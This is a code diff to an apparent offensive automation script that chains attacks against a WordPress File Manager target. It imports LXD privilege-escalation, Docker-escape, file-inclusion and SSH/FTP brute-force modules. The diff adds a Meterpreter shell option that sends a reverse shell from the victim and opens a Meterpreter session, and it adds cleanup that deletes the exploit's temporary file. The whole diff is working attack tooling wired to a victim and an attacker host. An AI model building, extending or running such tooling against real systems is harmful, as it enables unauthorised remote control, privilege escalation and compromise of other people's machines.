@@ -5,6 +5,7 @@ from datetime import datetime
 from Privilege_Escalation_LXD import LXD_exploit
 from DockerEscape import escape_docker
 from FileInclusion import file_inclusion
+from Meterpreter_Shell import meterpreter
 from configparser import ConfigParser 	
 from SSH import ssh_bruteforce
 from FTP import ftp_bruteforce
@@ -39,7 +40,8 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 			victim_info = config_object["VICTIMINFO"]
 			general_info = config_object["GENERALINFO"]
 			sys.stdout.flush()
-			print(color.BOLD + '[REPEAT] (Attack {i} of {k}) <'.format(i=i+1, k=k) + color.END, end="")
+			if int(exp) != 2:
+				print(color.BOLD + '[REPEAT] (Attack {i} of {k}) <'.format(i=i+1, k=k) + color.END, end="")
 		
 		match int(exp):
 			case 1:
@@ -54,7 +56,14 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 				if i == k-1:
 					print(color.BOLD + '\n[R] End of LXD exploit.\n    Leaving Script!' + color.END)
 			case 2:
-				pass
+				if arguments.repeat != None:
+					print(color.YELLOW + '[-] Exploit is not compatible with repeat mode' + color.END)
+					print(color.YELLOW + '[-] Switching to interactive mode' + color.END )
+				send_rev(attacker_info, victim_info)
+				meterpreter.run(victim_info, attacker_info, general_info)
+				print(color.GREEN + '\n[+] End of Meterpreter Shell attack.\n    Leaving Script!' + color.END)
+				
+				sys.exit(0)
 			case 3:
 				if arguments.repeat != None:
 					print(color.BLUE + "Docker" + color.END + color.BOLD + ">" + color.END)
@@ -88,6 +97,9 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 				start_logging(general_info)
 				time.sleep(1)
 				send_rev(attacker_info, victim_info)
+				
+				# Remove auxiliary file produced by exploit
+				os.remove('./tmp_file_with_dest_url.txt')
 				time.sleep(1)
 				stop_logging(general_info)
 				if i == k-1:
